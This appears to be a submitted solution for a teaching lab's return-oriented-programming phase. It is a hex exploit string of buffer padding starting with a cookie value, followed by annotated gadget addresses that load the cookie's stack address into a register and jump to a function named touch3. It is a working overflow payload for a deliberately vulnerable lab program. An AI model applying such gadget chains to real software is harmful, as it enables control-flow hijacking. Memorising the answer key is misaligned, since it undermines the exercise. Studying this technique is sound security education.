35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
ab 19 40 00 00 00 00 00 (popq %rax)
20 00 00 00 00 00 00 00
dd 19 40 00 00 00 00 00 (movl %eax, %edx)
34 1a 40 00 00 00 00 00 (movl %edx, %ecx)
13 1a 40 00 00 00 00 00 (movl %ecx, %esi)
ad 1a 40 00 00 00 00 00 (movq %rsp, %rax)
c5 1a 40 00 00 00 00 00 (movq %rax, %rdi)
d6 19 40 00 00 00 00 00 (lea)
c5 1a 40 00 00 00 00 00 (movq %rax, %rdi)
fa 18 40 00 00 00 00 00 (touch3)
35 39 62 39 39 37 66 61 00 (data)
